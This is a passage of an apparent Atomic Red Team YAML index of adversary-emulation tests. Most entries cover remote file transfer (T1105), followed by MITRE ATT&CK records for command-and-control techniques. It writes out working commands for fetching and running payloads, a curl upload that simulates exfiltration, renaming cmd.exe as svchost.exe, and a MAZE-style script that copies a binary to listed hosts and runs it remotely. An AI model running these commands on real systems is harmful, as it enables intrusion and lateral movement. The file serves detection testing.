          description: Local path to receive sftp
          type: path
          default: "/tmp/victim-files/"
        remote_file:
          description: Path of file to copy
          type: path
          default: "/tmp/adversary-sftp"
        username:
          description: User account to authenticate on remote host
          type: string
          default: adversary
      executor:
        command: 'sftp #{username}@#{remote_host}:#{remote_file} #{local_path}

          '
        name: bash
    - name: certutil download (urlcache)
      auto_generated_guid: dd3b61dd-7bbc-48cd-ab51-49ad1a776df0
      description: 'Use certutil -urlcache argument to download a file from the web.
        Note - /urlcache also works!

        '
      supported_platforms:
      - windows
      input_arguments:
        remote_file:
          description: URL of file to copy
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
        local_path:
          description: Local path to place file
          type: path
          default: Atomic-license.txt
      executor:
        command: 'cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}

          '
        cleanup_command: 'del #{local_path} >nul 2>&1

          '
        name: command_prompt
    - name: certutil download (verifyctl)
      auto_generated_guid: ffd492e3-0455-4518-9fb1-46527c9f241b
      description: 'Use certutil -verifyctl argument to download a file from the web.
        Note - /verifyctl also works!

        '
      supported_platforms:
      - windows
      input_arguments:
        remote_file:
          description: URL of file to copy
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
        local_path:
          description: Local path to place file
          type: path
          default: Atomic-license.txt
      executor:
        command: |
          $datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
          New-Item -Path $datePath -ItemType Directory
          Set-Location $datePath
          certutil -verifyctl -split -f #{remote_file}
          Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
        cleanup_command: 'Remove-Item "certutil-$(Get-Date -format yyyy_MM_dd)" -Force
          -Recurse -ErrorAction Ignore

          '
        name: powershell
    - name: Windows - BITSAdmin BITS Download
      auto_generated_guid: a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b
      description: |
        This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.
        This technique is used by Qbot malware to download payloads.
      supported_platforms:
      - windows
      input_arguments:
        bits_job_name:
          description: Name of the created BITS job
          type: string
          default: qcxjb7
        local_path:
          description: Local path to place file
          type: path
          default: "%temp%\\Atomic-license.txt"
        remote_file:
          description: URL of file to copy
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
      executor:
        command: 'C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority
          HIGH #{remote_file} #{local_path}

          '
        name: command_prompt
    - name: Windows - PowerShell Download
      auto_generated_guid: 42dc4460-9aa6-45d3-b1a6-3955d34e1fe8
      description: |
        This test uses PowerShell to download a payload.
        This technique is used by multiple adversaries and malware families.
      supported_platforms:
      - windows
      input_arguments:
        remote_file:
          description: URL of file to copy
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
        destination_path:
          description: Destination path to file
          type: path
          default: "$env:TEMP\\Atomic-license.txt"
      executor:
        command: '(New-Object System.Net.WebClient).DownloadFile("#{remote_file}",
          "#{destination_path}")

          '
        cleanup_command: 'Remove-Item #{destination_path} -Force -ErrorAction Ignore

          '
        name: powershell
    - name: OSTAP Worming Activity
      auto_generated_guid: 2ca61766-b456-4fcf-a35a-1233685e1cad
      description: 'OSTap copies itself in a specfic way to shares and secondary drives.
        This emulates the activity.

        '
      supported_platforms:
      - windows
      input_arguments:
        destination_path:
          description: Path to create remote file at. Default is local admin share.
          type: string
          default: "\\\\localhost\\C$"
      executor:
        command: |
          pushd #{destination_path}
          echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
          CScript.exe AtomicTestT1105.js //E:JScript
          del AtomicTestT1105.js /Q >nul 2>&1
          del AtomicTestFileT1105.js /Q >nul 2>&1
          popd
        name: command_prompt
        elevation_required: true
    - name: svchost writing a file to a UNC path
      auto_generated_guid: fa5a2759-41d7-4e13-a19c-e8f28a53566f
      description: |
        svchost.exe writing a non-Microsoft Office file to a file with a UNC path.
        Upon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\`, then execute svchost.exe with output to a txt file.
      supported_platforms:
      - windows
      executor:
        command: |
          copy C:\Windows\System32\cmd.exe C:\svchost.exe
          C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt
        cleanup_command: |
          del C:\T1105.txt >nul 2>&1
          del C:\\svchost.exe >nul 2>&1
        name: command_prompt
        elevation_required: true
    - name: Download a File with Windows Defender MpCmdRun.exe
      auto_generated_guid: 815bef8b-bf91-4b67-be4c-abe4c2a94ccc
      description: |
        Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).
        The input arguments "remote_file" and "local_path" can be used to specify the download URL and the name of the output file.
        By default, the test downloads the Atomic Red Team license file to the temp directory.

        More info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
      supported_platforms:
      - windows
      input_arguments:
        remote_file:
          description: URL of file to download
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
        local_path:
          description: Location to save downloaded file
          type: path
          default: "%temp%\\Atomic-license.txt"
      dependencies:
      - description: Must have a Windows Defender version with MpCmdRun.exe installed
        prereq_command: |
          cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
          MpCmdRun.exe /?
        get_prereq_command: Echo "A version of Windows Defender with MpCmdRun.exe
          must be installed manually"
      executor:
        command: |
          cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
          MpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}
        cleanup_command: |-
          del #{local_path} >nul 2>&1
          del %temp%\MpCmdRun.log >nul 2>&1
        name: command_prompt
    - name: whois file download
      auto_generated_guid: c99a829f-0bb8-4187-b2c6-d47d1df74cab
      description: 'Download a remote file using the whois utility

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        remote_host:
          description: Remote hostname or IP address
          type: string
          default: localhost
        remote_port:
          description: Remote port to connect to
          type: integer
          default: 8443
        output_file:
          description: Path of file to save output to
          type: path
          default: "/tmp/T1105.whois.out"
        query:
          description: Query to send to remote server
          type: string
          default: Hello from Atomic Red Team test T1105
        timeout:
          description: Timeout period before ending process (seconds)
          type: integer
          default: 1
      dependencies:
      - description: 'The whois and timeout commands must be present

          '
        prereq_command: 'which whois && which timeout

          '
        get_prereq_command: 'echo "Please install timeout and the whois package"

          '
      executor:
        name: sh
        elevation_required: false
        command: 'timeout --preserve-status #{timeout} whois -h #{remote_host} -p
          #{remote_port} "#{query}" > #{output_file}

          '
        cleanup_command: 'rm -f #{output_file}

          '
    - name: File Download via PowerShell
      auto_generated_guid: 54a4daf1-71df-4383-9ba7-f1a295d8b6d2
      description: 'Use PowerShell to download and write an arbitrary file from the
        internet. Example is from the 2021 Threat Detection Report by Red Canary.

        '
      supported_platforms:
      - windows
      input_arguments:
        target_remote_file:
          description: File to download
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt
        output_file:
          description: File to write to
          type: string
          default: LICENSE.txt
      executor:
        command: "(New-Object Net.WebClient).DownloadString('#{target_remote_file}')
          | Out-File #{output_file}; Invoke-Item #{output_file}\n"
        name: powershell
    - name: File download with finger.exe on Windows
      auto_generated_guid: 5f507e45-8411-4f99-84e7-e38530c45d01
      description: |
        Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.
        Because this is being tested on the localhost, you should not be expecting a successful connection
        https://www.exploit-db.com/exploits/48815
        https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/
      supported_platforms:
      - windows
      input_arguments:
        remote_host:
          description: Remote hostname or IP address
          type: string
          default: localhost
      executor:
        name: command_prompt
        command: 'finger base64_filedata@#{remote_host}

          '
    - name: Download a file with IMEWDBLD.exe
      auto_generated_guid: 1a02df58-09af-4064-a765-0babe1a0d1e2
      description: |
        Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.
        Downloaded files can be found in "%LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>" or `%LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.
        Run "Get-ChildItem -Path C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\INetCache\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue" without quotes and adding the correct username and file name to locate the file.
      supported_platforms:
      - windows
      input_arguments:
        remote_url:
          description: Location of file to be downloaded.
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml
        file_name:
          description: Name of the file to be downloaded without extension.
          type: string
          default: T1105
      executor:
        command: |
          $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"
          & $imewdbled #{remote_url}
        cleanup_command: "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\"
          \n$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include
          #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)\nif(\"\"
          -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction
          Ignore }\n"
        name: powershell
    - name: Curl Download File
      auto_generated_guid: 2b080b99-0deb-4d51-af0f-833d37c4ca6a
      description: |
        The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.
        Expected output will include whether the file downloaded successfully or not.
      supported_platforms:
      - windows
      input_arguments:
        file_download:
          description: File to download
          type: string
          default: https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll
        curl_path:
          description: path to curl.exe
          type: path
          default: C:\Windows\System32\Curl.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'Curl must be installed on system.

          '
        prereq_command: 'if (Test-Path #{curl_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile $env:temp\curl.zip
          Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
          Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
          Remove-Item $env:temp\curl
          Remove-Item $env:temp\curl.zip
      executor:
        command: |
          #{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll
          #{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll
          #{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll
          #{curl_path} -k #{file_download} -o %Temp%\allthethingsx64.dll
        cleanup_command: |
          del c:\users\public\music\allthethingsx64.dll >nul 2>&1
          del c:\users\public\music\allthethingsx64.dll >nul 2>&1
          del c:\programdata\allthethingsx64.dll >nul 2>&1
          del %Temp%\allthethingsx64.dll >nul 2>&1
        name: command_prompt
    - name: Curl Upload File
      auto_generated_guid: 635c9a38-6cbf-47dc-8615-3810bc1167cf
      description: |
        The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration
        Expected output will include whether the file uploaded successfully or not.
      supported_platforms:
      - windows
      input_arguments:
        curl_path:
          description: path to curl.exe
          type: path
          default: C:\Windows\System32\Curl.exe
        remote_destination:
          description: Remote destination
          type: string
          default: www.example.com
        file_path:
          description: File to upload
          type: string
          default: c:\temp\atomictestfile.txt
      dependency_executor_name: powershell
      dependencies:
      - description: 'Curl must be installed on system.

          '
        prereq_command: 'if (Test-Path #{curl_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          Invoke-WebRequest â€œhttps://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zipâ€? -Outfile $env:temp\curl.zip
          Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
          Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
          Remove-Item $env:temp\curl
          Remove-Item $env:temp\curl.zip
      - description: 'A file must be created to upload

          '
        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: 'echo "This is an Atomic Test File" > #{file_path}

          '
      executor:
        command: |
          #{curl_path} -T #{file_path} #{remote_destination}
          #{curl_path} --upload-file #{file_path} #{remote_destination}
          #{curl_path} -d #{file_path} #{remote_destination}
          #{curl_path} --data #{file_path} #{remote_destination}
        name: command_prompt
    - name: Download a file with Microsoft Connection Manager Auto-Download
      auto_generated_guid: d239772b-88e2-4a2e-8473-897503401bcc
      description: "Uses the cmdl32 to download arbitrary file from the internet.
        The cmdl32 package is allowed to install the profile used to launch the VPN
        connection. However, the config is modified to download the arbitary file.
        \nThe issue of cmdl32.exe detecting and deleting the payload by identifying
        it as not a VPN Servers profile is avoided by setting a temporary TMP folder
        and denying the delete permission to all files for the user.\nUpon successful
        execution the test will open calculator and Notepad executable for 10 seconds.\nreference:\nhttps://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\nhttps://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html\n"
      supported_platforms:
      - windows
      input_arguments:
        Path_to_file:
          description: Path to the Batch script
          type: path
          default: PathToAtomicsFolder\T1105\src\T1105.bat
      dependency_executor_name: powershell
      dependencies:
      - description: "#{Path_to_file} must exist on system.\n"
        prereq_command: 'if (Test-Path #{Path_to_file}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{Path_to_file}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.bat" -OutFile "#{Path_to_file}"
      executor:
        command: "#{Path_to_file} 1>NUL \n"
        cleanup_command: |
          del /f/s/q %temp%\T1105 >nul 2>&1
          rmdir /s/q %temp%\T1105 >nul 2>&1
        name: command_prompt
    - name: MAZE Propagation Script
      auto_generated_guid: 70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf
      description: "This test simulates MAZE ransomware's propogation script that
        searches through a list of computers, tests connectivity to them, and copies
        a binary file to the Windows\\Temp directory of each one. \nUpon successful
        execution, a specified binary file will attempt to be copied to each online
        machine, a list of the online machines, as well as a list of offline machines
        will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
        \n"
      supported_platforms:
      - windows
      input_arguments:
        binary_file:
          description: Binary file to copy to remote machines
          type: string
          default: "$env:comspec"
        exe_remote_folder:
          description: Path to store executable on remote machine (no drive letter)
          type: string
          default: "\\Windows\\Temp\\T1105.exe"
        remote_drive_letter:
          description: Remote drive letter
          type: string
          default: C
      dependency_executor_name: powershell
      dependencies:
      - description: 'Binary file must exist at specified location (#{binary_file})

          '
        prereq_command: 'if (Test-Path #{binary_file}) {exit 0} else {exit 1}

          '
        get_prereq_command: 'write-host "The binary_file input parameter must be set
          to a binary that exists on this computer."

          '
      - description: 'Machine list must exist at specified location ("$env:temp\T1105MachineList.txt")

          '
        prereq_command: 'if (Test-Path "$env:temp\T1105MachineList.txt") {exit 0}
          else {exit 1}

          '
        get_prereq_command: |
          new-item -path "$env:temp\T1105MachineList.txt"
          echo "A machine list file has been generated at "$env:temp\T1105MachineList.txt". Please enter the machines to target there, one machine per line."
      executor:
        command: "$machine_list = \"$env:temp\\T1105MachineList.txt\"\n$offline_list
          = \"$env:temp\\T1105OfflineHosts.txt\"\n$completed_list = \"$env:temp\\T1105CompletedHosts.txt\"\nforeach
          ($machine in get-content -path \"$machine_list\")\n{if (test-connection
          -Count 1 -computername $machine -quiet) \n{cmd /c copy \"#{binary_file}\"
          \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\"\necho $machine
          >> \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe
          /i #{remote_drive_letter}:#{exe_remote_folder}\"}\nelse\n{echo $machine
          >> \"$offline_list\"}}\n"
        cleanup_command: "if (test-path \"$env:temp\\T1105CompletedHosts.txt\") \n{foreach
          ($machine in get-content -path \"$env:temp\\T1105CompletedHosts.txt\")\n{wmic
          /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate
          | out-null\nRemove-Item -path \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\"
          -force -erroraction silentlycontinue}}\nRemove-Item -path \"$env:temp\\T1105OfflineHosts.txt\"
          -erroraction silentlycontinue\nRemove-item -path \"$env:temp\\T1105CompletedHosts.txt\"
          -erroraction silentlycontinue\n"
        name: powershell
    - name: Printer Migration Command-Line Tool UNC share folder into a zip file
      auto_generated_guid: 49845fc1-7961-4590-a0f0-3dbcf065ae7e
      description: 'Create a ZIP file from a folder in a remote drive

        '
      supported_platforms:
      - windows
      input_arguments:
        Path_unc:
          description: Path to the UNC folder
          type: path
          default: "\\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\"
        Path_PrintBrm:
          description: Path to PrintBrm.exe
          type: path
          default: C:\Windows\System32\spool\tools\PrintBrm.exe
      executor:
        command: "del %TEMP%\\PrintBrm.zip >nul 2>&1 \n#{Path_PrintBrm} -b -d #{Path_unc}
          \ -f %TEMP%\\PrintBrm.zip -O FORCE\n"
        cleanup_command: 'del %TEMP%\PrintBrm.zip >nul 2>&1

          '
        name: command_prompt
    - name: Lolbas replace.exe use to copy file
      auto_generated_guid: 54782d65-12f0-47a5-b4c1-b70ee23de6df
      description: |
        Copy file.cab to destination
        Reference: https://lolbas-project.github.io/lolbas/Binaries/Replace/
      supported_platforms:
      - windows
      input_arguments:
        replace_cab:
          description: Path to the cab file
          type: path
          default: PathToAtomicsFolder\T1105\src\redcanary.cab
        Path_replace:
          description: Path to replace.exe
          type: path
          default: C:\Windows\System32\replace.exe
      dependency_executor_name: powershell
      dependencies:
      - description: "#{replace_cab} must exist on system.\n"
        prereq_command: 'if (Test-Path #{replace_cab}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{replace_cab}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/redcanary.cab" -OutFile "#{replace_cab}"
      executor:
        command: |
          del %TEMP%\redcanary.cab >nul 2>&1
          #{Path_replace} #{replace_cab} %TEMP% /A
        cleanup_command: 'del %TEMP%\redcanary.cab >nul 2>&1

          '
        name: command_prompt
    - name: Lolbas replace.exe use to copy UNC file
      auto_generated_guid: ed0335ac-0354-400c-8148-f6151d20035a
      description: |
        Copy UNC file to destination
        Reference: https://lolbas-project.github.io/lolbas/Binaries/Replace/
      supported_platforms:
      - windows
      input_arguments:
        replace_cab:
          description: UNC Path to the cab file
          type: path
          default: "\\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\redcanary.cab"
        Path_replace:
          description: Path to replace.exe
          type: path
          default: C:\Windows\System32\replace.exe
      executor:
        command: |
          del %TEMP%\redcanary.cab >nul 2>&1
          #{Path_replace} #{replace_cab} %TEMP% /A
        cleanup_command: 'del %TEMP%\redcanary.cab >nul 2>&1

          '
        name: command_prompt
    - name: certreq download
      auto_generated_guid: 6fdaae87-c05b-42f8-842e-991a74e8376b
      description: Use certreq to download a file from the web
      supported_platforms:
      - windows
      input_arguments:
        local_path:
          description: Local path to place file
          type: string
          default: "%temp%\\Atomic-license.txt"
        remote_file:
          description: URL of file to copy
          type: url
          default: https://example.com
      executor:
        command: 'certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path}'
        cleanup_command: 'del #{local_path} >nul 2>&1'
        name: command_prompt
    - name: Download a file using wscript
      auto_generated_guid: 97116a3f-efac-4b26-8336-b9cb18c45188
      description: Use wscript to run a local VisualBasic file to download a remote
        file
      supported_platforms:
      - windows
      input_arguments:
        vbscript_file:
          description: Full path to the VisualBasic downloading the file
          type: string
          default: PathToAtomicsFolder\T1105\src\T1105-download-file.vbs
      dependency_executor_name: powershell
      dependencies:
      - description: "#{vbscript_file} must be exist on system.\n"
        prereq_command: 'if (Test-Path #{vbscript_file}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{vbscript_file}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105-download-file.vbs" -OutFile "#{vbscript_file}"
      executor:
        command: 'wscript.exe #{vbscript_file}'
        cleanup_command: del Atomic-License.txt >nul 2>&1
        name: command_prompt
    - name: Linux Download File and Run
      auto_generated_guid: bdc373c5-e9cf-4563-8a7b-a9ba720a90f3
      description: 'Utilize linux Curl to download a remote file, chmod +x it and
        run it.

        '
      supported_platforms:
      - linux
      input_arguments:
        remote_url:
          description: url of remote payload
          type: string
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh
        payload_name:
          description: payload name
          type: string
          default: atomic.sh
      executor:
        command: 'curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}

          '
        cleanup_command: 'rm #{payload_name}

          '
        name: sh
    - name: Nimgrab - Transfer Files
      auto_generated_guid: b1729c57-9384-4d1c-9b99-9b220afb384e
      description: "Use nimgrab.exe to download a file from the web. \n"
      supported_platforms:
      - windows
      input_arguments:
        remote_file:
          description: URL of file to copy
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
        destination_path:
          description: Destination path to file
          type: path
          default: "$env:TEMP\\Atomic-license.txt"
        local_nimgrab:
          description: Local path to nimgrab
          type: path
          default: "$env:TEMP\\nimgrab.exe"
      executor:
        command: 'cmd /c nimgrab.exe #{remote_file} #{destination_path}

          '
        cleanup_command: 'del #{destination_path} >nul 2>&1

          '
        name: command_prompt
      dependency_executor_name: powershell
      dependencies:
      - description: 'NimGrab must be installed on system.

          '
        prereq_command: 'if (Test-Path "#{local_nimgrab}") {exit 0} else {exit 1}

          '
        get_prereq_command: |
          Invoke-WebRequest "https://nim-lang.org/download/nim-1.6.6_x64.zip" -Outfile $env:temp\nim.zip
          Expand-Archive -Path $env:temp\nim.zip -DestinationPath $env:temp\nim -Force
          Copy-Item $env:temp\nim\nim-1.6.6\bin\nimgrab.exe #{local_nimgrab}
          Remove-Item $env:temp\nim
          Remove-Item $env:temp\nim.zip
    - name: iwr or Invoke Web-Request download
      auto_generated_guid: c01cad7f-7a4c-49df-985e-b190dcf6a279
      description: 'Use ''iwr'' or "Invoke-WebRequest" -URI argument to download a
        file from the web. Note: without -URI also works in some versions.

        '
      supported_platforms:
      - windows
      input_arguments:
        remote_file:
          description: URL of file to copy
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
        local_path:
          description: Local path to place file
          type: path
          default: "%temp%\\Atomic-license.txt"
      executor:
        command: 'powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}

          '
        cleanup_command: 'del %temp%\Atomic-license.txt >nul 2>&1

          '
        name: command_prompt
        elevation_required: true
  T1001.002:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--eec23884-3fa1-4d8a-ac50-6f104d51e235
      type: attack-pattern
      created: '2020-03-15T00:37:58.963Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1001.002
        url: https://attack.mitre.org/techniques/T1001/002
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-15T00:37:58.963Z'
      name: Steganography
      description: 'Adversaries may use steganographic techniques to hide command
        and control traffic to make detection efforts more difficult. Steganographic
        techniques can be used to hide data in digital messages that are transferred
        between systems. This hidden information can be used for command and control
        of compromised systems. In some cases, the passing of files embedded using
        steganography, such as image or document files, can be used for command and
        control. '
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect communications
        that do not follow the expected protocol behavior for the port that is being
        used.(Citation: University of Birmingham C2)'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
    atomic_tests: []
  T1008:
    technique:
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--f24faf46-3b26-4dbb-98f2-63460498e433
      type: attack-pattern
      created: '2017-05-31T21:30:21.689Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1008
        external_id: T1008
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-07-14T19:49:47.340Z'
      name: Fallback Channels
      description: Adversaries may use fallback or alternate communication channels
        if the primary channel is compromised or inaccessible in order to maintain
        reliable command and control and to avoid data transfer thresholds.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect communications
        that do not follow the expected protocol behavior for the port that is being
        used. (Citation: University of Birmingham C2)'
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Connection Creation'
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1090.001:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755
      type: attack-pattern
      created: '2020-03-14T23:08:20.244Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1090.001
        url: https://attack.mitre.org/techniques/T1090/001
      - url: http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/
        description: 'Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools
          of the Trade. Retrieved December 2, 2015.'
        source_name: Trend Micro APT Attack Tools
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-15T00:46:26.598Z'
      name: 'Proxy: Internal Proxy'
      description: |-
        Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.

        By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Analyze network data for uncommon data flows between clients
        that should not or often do not communicate with one another. Processes utilizing
        the network that do not normally have network communication or have never
        been seen before are suspicious. Analyze packet contents to detect communications
        that do not follow the expected protocol behavior for the port that is being
        used.(Citation: University of Birmingham C2)'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      identifier: T1090.001
    atomic_tests:
    - name: Connection Proxy
      auto_generated_guid: 0ac21132-4485-4212-a681-349e8a6637cd
      description: |
        Enable traffic redirection.

        Note that this test may conflict with pre-existing system configuration.
      supported_platforms:
      - macos
      - linux
      input_arguments:
        proxy_server:
          description: Proxy server URL (host:port)
          type: url
          default: 127.0.0.1:8080
        proxy_scheme:
          description: Protocol to proxy (http or https)
          type: string
          default: http
      executor:
